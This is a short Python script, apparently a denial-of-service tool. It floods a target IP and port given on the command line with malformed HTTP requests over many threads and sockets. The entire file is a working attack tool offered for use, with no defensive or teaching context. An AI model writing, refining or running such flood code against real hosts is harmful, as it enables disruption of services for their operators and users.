import socket,threading,random,string,sys
mode = 0

def http_flood(ip,port,method,count):
    for _ in range(count):
        list_socket = []
        for _ in range(25):
            try:
                s2 = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s2.connect((ip,port))
                s2.connect_ex((ip,port))
                list_socket.append(s2)
            except:pass
        while True:
            global mode
            if mode == 1:
               print("flooding . . .")
               for s in list_socket:
                try:
 
                 c = "\n\r"
                 packet = [f'{method} /{"".join(random.choice(string.ascii_letters + string.digits + string.punctuation) for _ in range(1))} HTTP/1.1\nHost: {ip}{"".join(random.choice(c) for _ in range(4))}'.encode(),f'{method} / HTTP/1.1{"".join(random.choice(c) for _ in range(4))}'.encode()]
                 for p in packet:
                  for _ in range(2500):
                   s.send(p)
                   s.sendall(p)
                except Exception as e:pass
               break

ip = sys.argv[1]
port = int(sys.argv[2])
for _ in range(int(sys.argv[3])*5):
    threading.Thread(target=http_flood,args=(ip,port,sys.argv[5],int(sys.argv[4]))).start() # <IP> <PORT> <THREAD> <TIME> <METHOD_HTTP>
mode = 1